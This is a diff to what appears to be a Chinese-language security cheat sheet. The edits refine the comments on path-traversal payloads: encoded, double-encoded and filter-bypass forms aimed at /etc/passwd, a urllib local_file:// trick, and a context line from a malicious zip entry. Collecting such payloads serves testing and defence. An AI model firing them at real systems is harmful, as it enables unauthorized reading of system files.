@@ -523,10 +523,10 @@ z_file.writestr(z_info, "malicious code")
 
 # 路径遍历 payload
 ../../../etc/passwd
-....//....//....//etc/passwd  # 绕过../过滤
+....//....//....//etc/passwd  # 绕过../过滤: 删除匹配后形成新../
 ..%2F..%2F..%2Fetc%2Fpasswd  # URL编码
 %2e%2e%2f  # URL编码
-%252e%252e%252f  # 双重编码
+%252e%252e%252f  # 双重编码 (需二次解码场景)
 ..\/..\/..\/etc/passwd  # 混合斜杠
 local_file:///etc/passwd  # urllib绕过
 
